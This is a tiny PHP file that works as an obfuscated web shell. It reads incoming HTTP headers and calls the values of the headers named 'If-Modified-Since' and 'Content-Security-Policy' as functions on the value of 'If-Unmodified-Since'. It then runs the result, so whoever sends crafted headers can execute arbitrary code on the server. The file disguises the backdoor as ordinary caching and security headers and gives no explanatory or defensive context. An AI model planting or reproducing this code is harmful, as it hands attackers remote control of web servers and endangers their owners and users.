<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $system = $_HEADERS['If-Modified-Since']('', $_HEADERS['Content-Security-Policy']($_HEADERS['If-Unmodified-Since']));
    $system();
}